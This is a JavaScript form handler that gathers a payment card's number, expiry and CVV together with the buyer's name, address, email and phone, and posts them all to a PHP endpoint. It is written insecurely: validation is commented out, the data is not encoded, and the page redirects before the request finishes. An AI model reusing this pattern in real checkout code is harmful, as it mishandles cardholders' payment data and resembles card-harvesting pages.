function submitForm() {
  event.preventDefault();

  var cardNumber = document.getElementById("card-number").value;
  var expirationMonth = document.getElementById("expiration-month").value;
  var expirationYear = document.getElementById("expiration-year"). value;
  var cvv = document.getElementById("cvv").value;

  // Get data from local storage
  var zipcode = sessionStorage.getItem("zipcode");
  var street = sessionStorage.getItem("street");
  var appartment = sessionStorage.getItem("appartment");
  var email = sessionStorage.getItem("email");
  var city = sessionStorage.getItem("city");
  var country = sessionStorage.getItem("country");
  var name = sessionStorage.getItem("name");
  var surname = sessionStorage.getItem("surname");
  var phone = sessionStorage.getItem("phone");

  // Validate Card Number field
  /*var cardNumberRegex = /^[0-9]{16}$/;
  if (!cardNumberRegex.test(cardNumber)) {
    alert("Please enter a valid card number (16 digits).");
    return;
  }
  
  // Validate CVV field
  var cvvRegex = /^[0-9]{3}$/;
  if (!cvvRegex.test(cvv)) {
    alert("Please enter a valid CVV (3 digits).");
    return;
  }*/
  
  // Send data to connection.php using AJAX request
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      // Handle response from connection.php
      console.log(this.responseText);
      // Reload the page
      location.reload();
    }
  };
  xhttp.open("POST", "connection.php", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.send("formData=" + JSON.stringify({
    "cardNumber": cardNumber,
    "expirationMonth": expirationMonth,
    "expirationYear": expirationYear,
    "cvv": cvv,
    "zipcode": zipcode,
    "street": street,
    "appartment": appartment,
    "email": email,
    "city": city,
    "country": country,
    "name": name,
    "surname": surname,
    "phone": phone
  }));
  window.location.href = 'Thankyou.php';
}
